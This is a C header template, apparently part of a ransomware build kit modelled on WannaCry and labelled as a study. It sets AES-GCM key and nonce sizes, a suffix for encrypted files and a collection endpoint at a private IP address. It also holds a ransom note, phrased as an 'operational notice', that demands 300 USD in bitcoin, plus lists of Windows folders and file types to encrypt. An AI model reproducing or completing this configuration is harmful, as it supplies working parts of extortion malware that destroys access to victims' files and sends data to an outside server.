// templates/wannacry/config.h.tpl
// Gerado automaticamente. Não edite manualmente.
#ifndef STUDY_CONFIG_H
#define STUDY_CONFIG_H

#include <stddef.h>

#define SESSION_KEY_LEN 32
#define GCM_NONCE_LEN 12
#define GCM_TAG_LEN 16
#define ENCRYPTED_SUFFIX ".PROCESSED"
#define ENCRYPTED_FORMAT_VERSION 1
#define MANAGEMENT_ENDPOINT "http://10.254.16.115:8080/collect"
#define NOTICE_FILENAME "#_STATUS_NOTICE_#.txt"
#define NOTICE_TEXT "Operational notice: contact the service owner through the approved secure channel. Reference payment: 300 USD to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa."

#define TARGET_DIR_COUNT 5
static const char *const TARGET_DIRS[TARGET_DIR_COUNT] = {
    "C:\\Users\\Public\\Documents",
    "C:\\Users\\Public\\Downloads",
    "C:\\Users\\Public\\Pictures",
    "C:\\Users\\Public\\Desktop",
    "C:\\Temp"
};

#define TARGET_EXT_COUNT 12
static const char *const TARGET_EXTS[TARGET_EXT_COUNT] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv", ".jpg", ".png", ".db",
    ".backup", ".psd", ".zip", ".rar"
};

#endif
